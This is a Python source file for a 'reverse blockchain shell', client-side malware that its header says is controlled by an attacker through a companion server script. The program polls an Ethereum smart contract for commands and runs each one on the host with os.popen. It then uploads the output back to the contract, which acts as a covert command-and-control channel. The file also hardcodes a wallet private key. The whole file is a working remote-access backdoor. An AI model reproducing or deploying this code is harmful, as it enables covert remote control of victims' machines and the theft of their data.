## Name        : ReverseBlockChainShell.py
## Date        : 30.01.2022
## Author      : Shkedo
## Description : This program will create a connection to a smartcontract to interact with the attacker.
##               This program will read commands from the blockchain, execute them and upload the output back to the blockchain.
##               The attacker will be controlling the contract with "ReverseBlockChainShell_Server.py".

# Imports.
import os
from web3 import Web3
import time

# Constants.
SOLIDITY_VERSION = "0.6.0"
CONTRACT_ADDR = "0xDa2715596E4Fa50d9D6a64891827C47F01b1C75d"
CONTRACT_ABI = [
    {"inputs": [], "stateMutability": "nonpayable", "type": "constructor"},
    {
        "inputs": [{"internalType": "string", "name": "output_", "type": "string"}],
        "name": "AddOutput",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetCommand",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetOutput",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetisCommandReady",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "GetisOutputReady",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "Reset",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "string", "name": "command_", "type": "string"}],
        "name": "SetCommand",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "string", "name": "output_", "type": "string"}],
        "name": "SetOutput",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "uint256", "name": "isCommandReady_", "type": "uint256"}
        ],
        "name": "SetisCommandReady",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "uint256", "name": "isOutputReady_", "type": "uint256"}
        ],
        "name": "SetisOutputReady",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
]
GANACHE_SERVICE = "HTTP://127.0.0.1:7545"
CHAIN_ID = 1337
ACCOUNT0_ADDR = "0x9F4D94E21B6E7Bd19B06f70CF071388D13677c2C"
PRIVATE_KEY = "0x39dee5436bfb01ad0dfc372b85306ed85344d965fa967db8e8d16b4ae1a864ab"

# Initialize the web3 provider object.
W3_ENGINE = Web3(Web3.HTTPProvider(GANACHE_SERVICE))
CNC_CONTRACT = W3_ENGINE.eth.contract(CONTRACT_ADDR, abi=CONTRACT_ABI)

# Main
def main():
    command = ""

    # While the attacker didn't choose to stop.
    while command != "exit":

        # Wait for a connection to the client\wait for the client to send command output.
        while not CNC_CONTRACT.functions.GetisCommandReady().call():
            time.sleep(1)

        # Get command to execute.
        command = CNC_CONTRACT.functions.GetCommand().call()

        # Set isCommandReady to false.
        SetisCommandReady(0)

        # Run command.
        output = os.popen(command).read()

        # Send output.
        SetOutput(output)

        # Set isOutputReady to true.
        SetisOutputReady(1)


# SetOutput() executes a transaction to set output variable.
def SetOutput(output):
    return RunTransaction(
        "SetOutput",
        [output],
    )


# Executes a transaction to set isCommandReady variable.
def SetisCommandReady(arg):
    return RunTransaction(
        "SetisCommandReady",
        [arg],
    )


# Executes a transaction to set isOutputReady variable.
def SetisOutputReady(arg):
    return RunTransaction(
        "SetisOutputReady",
        [arg],
    )


# RunTransaction runs a transaction on the blockchain.
# Gets from address, private key, contract object, function name (in string), amount of eth to transfer, argv (to pass arguments to the function).
def RunTransaction(
    function_name,  # Function name in the smart contract.
    argv=[],  # For passing arguments to the function called.
):
    gasPrice = W3_ENGINE.eth.gas_price
    transaction = W3_ENGINE.eth.send_raw_transaction(
        W3_ENGINE.eth.account.sign_transaction(
            getattr(CNC_CONTRACT.functions, function_name)(*argv).buildTransaction(
                {
                    "gasPrice": gasPrice,
                    "chainId": CHAIN_ID,
                    "from": ACCOUNT0_ADDR,
                    "nonce": W3_ENGINE.eth.getTransactionCount(ACCOUNT0_ADDR),
                    "value": 0,
                }
            ),
            PRIVATE_KEY,
        ).rawTransaction
    )
    return transaction, W3_ENGINE.eth.wait_for_transaction_receipt(transaction)


if __name__ == "__main__":
    main()
